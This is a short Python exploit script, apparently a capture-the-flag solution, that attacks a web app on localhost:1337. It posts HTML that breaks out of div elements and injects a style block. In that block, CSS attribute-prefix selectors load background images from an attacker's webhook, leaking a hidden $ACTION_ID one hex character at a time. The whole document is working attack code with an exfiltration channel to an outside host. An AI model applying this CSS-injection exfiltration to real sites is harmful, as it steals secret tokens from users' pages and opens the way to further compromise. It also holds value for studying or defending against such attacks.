from requests import post

# Store the URL of our webhook for use in generating a payload
webhook = "<webhook here>"

# The URL of the host we are attacking
host = "http://localhost:1337"

# Generates  our payload
def gen_payload(crib):
	# Start the payload with closing out the two div elements and then starting a style tag
    payload = "</div></div><style>"
    # The action ID is hexadecimal so loop through that charset
    for char in "0123456789abcdef":
	    # Guess what we already know and the next character
        guess = crib + char
        # Add the CSS selector to test this guess
        payload += "form:has(input[name^=\"$ACTION_ID_" + guess + "\"]){background:url("+webhook+"?value="+(guess)+");}"
    # Test if the payload is equal to what we already know (says we're done)
    payload += "form:has(input[name=\"$ACTION_ID_" + crib + "\"]){background:url("+webhook+"?value="+(crib)+");}"
    # Close out the style tag and re-enter the two div elements
    payload += "</style><div><div>"
    # Return our final payload
    return payload

# Stores what we currently know as the action ID
key = ""
while True:
	# Send a request to /api/submit with our payload
    print(post(host + "/api/submit", json={"beg":gen_payload(key)}).text)
    # Get the new key we get from this
    key = input("New key:")
